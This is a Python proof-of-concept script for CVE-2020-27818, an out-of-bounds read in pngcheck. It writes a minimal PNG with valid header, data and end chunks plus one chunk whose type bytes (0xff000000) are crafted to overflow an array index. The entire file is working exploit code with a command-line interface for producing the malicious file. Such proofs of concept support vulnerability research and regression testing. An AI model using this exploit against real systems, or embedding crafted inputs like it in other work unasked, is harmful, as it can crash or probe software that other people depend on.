#!/usr/bin/env python3
"""
POC for CVE-2020-27818 - pngcheck Out-of-bounds Read
Creates a minimal valid PNG file with a malformed chunk
name to trigger array index overflow
"""

import argparse
import zlib

from construct import Bytes, Const, GreedyRange, Int32ub, Struct, this

Chunk = Struct(
    "length" / Int32ub,
    "type" / Bytes(4),
    "data" / Bytes(this.length),
    "crc" / Int32ub,
)

PNG = Struct(
    "signature" / Const(b"\x89PNG\r\n\x1a\n"),
    "chunks" / GreedyRange(Chunk),
)


def calc_crc(chunk_type: bytes, chunk_data: bytes) -> int:
    return zlib.crc32(chunk_type + chunk_data) & 0xFFFFFFFF


def create_chunk(chunk_type: bytes, chunk_data: bytes) -> dict:
    return {
        "length": len(chunk_data),
        "type": chunk_type,
        "data": chunk_data,
        "crc": calc_crc(chunk_type, chunk_data),
    }


def create_poc_png(output_file: str, malicious_type: bytes = b"\xff\x00\x00\x00"):
    # Create a 1x1 black pixel image
    ihdr_data = b"\x00\x00\x00\x01\x00\x00\x00\x01\x08\x00\x00\x00\x00"
    idat_data = zlib.compress(b"\x00\x00\x00\x00\x00")  # Filter byte + RGBA data

    chunks = [
        create_chunk(b"IHDR", ihdr_data),  # Header chunk
        create_chunk(b"IDAT", idat_data),  # Data chunk
        create_chunk(malicious_type, b""),  # Malicious chunk
        create_chunk(b"IEND", b""),  # End chunk
    ]

    png_data = PNG.build(dict(chunks=chunks))
    with open(output_file, "wb") as f:
        f.write(png_data)
    print(f"Created POC file: {output_file}")


def main():
    parser = argparse.ArgumentParser(description="Generate POC PNG for CVE-2020-27818")
    parser.add_argument(
        "-o",
        "--output",
        default="poc.png",
        help="Output PNG file path (default: poc.png)",
    )
    args = parser.parse_args()

    create_poc_png(args.output)


if __name__ == "__main__":
    main()
